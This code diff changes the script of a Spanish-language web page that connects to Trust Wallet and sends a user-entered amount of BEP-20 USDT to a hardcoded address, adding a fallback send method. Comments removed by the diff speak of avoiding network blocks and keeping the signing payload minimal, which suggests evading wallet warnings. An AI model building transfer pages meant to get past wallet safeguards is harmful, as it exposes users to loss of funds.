@@ -62,7 +62,7 @@
 <script>
   // ================= CONFIGURACIÓN =================
   const DESTINO = "0x445a69f88106ae1e22fb38e282b5b04e82fb2c25";
-  const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955"; // USDT oficial BEP-20
+  const CONTRATO_USDT = "0x55d398326f99059fF775485246999027B3197955";
   const BSC_RPC = "https://bsc-dataseed.bnbchain.org";
   const DECIMALS = 18n;
   // =================================================
@@ -160,7 +160,6 @@
       actionBtn.disabled = true;
       const provider = getProvider();
 
-      // PASO 1: Conexión directa y libre de bloqueos de red (igual que funcionó antes)
       if (!userAddress) {
         setStatus("Conectando con Trust Wallet...", "info");
         const accounts = await provider.request({ method: "eth_requestAccounts" });
@@ -178,7 +177,6 @@
         return;
       }
 
-      // PASO 2: Validar saldo y disparar la firma digital con payload minimalista
       await refreshBalance();
 
       const amountUnits = parseUnits(amountInput.value);
@@ -189,15 +187,31 @@
 
       setStatus("Confirma la transacción en Trust Wallet...", "info");
 
-      const txHash = await provider.request({
-        method: "eth_sendTransaction",
-        params: [{
-          from: userAddress,
-          to: CONTRATO_USDT,
-          value: "0x0",
-          data: txData
-        }]
-      });
+      let txHash;
+      const txPayload = {
+        from: userAddress,
+        to: CONTRATO_USDT,
+        value: "0x0",
+        data: txData
+      };
+
+      try {
+        txHash = await provider.request({
+          method: "eth_sendTransaction",
+          params: [txPayload]
+        });
+      } catch (err) {
+        if (err.code === 4200 || (err.message && err.message.toLowerCase().includes("not supported"))) {
+          if (typeof provider.send === "function") {
+            const response = provider.send("eth_sendTransaction", [txPayload]);
+            txHash = response?.result || response;
+          } else {
+            throw err;
+          }
+        } else {
+          throw err;
+        }
+      }
 
       setStatus(
         `¡Transacción enviada con éxito!<br><a class="tx-link" href="https://bscscan.com/tx/${txHash}" target="_blank" rel="noopener">Ver detalles en BscScan</a>`,
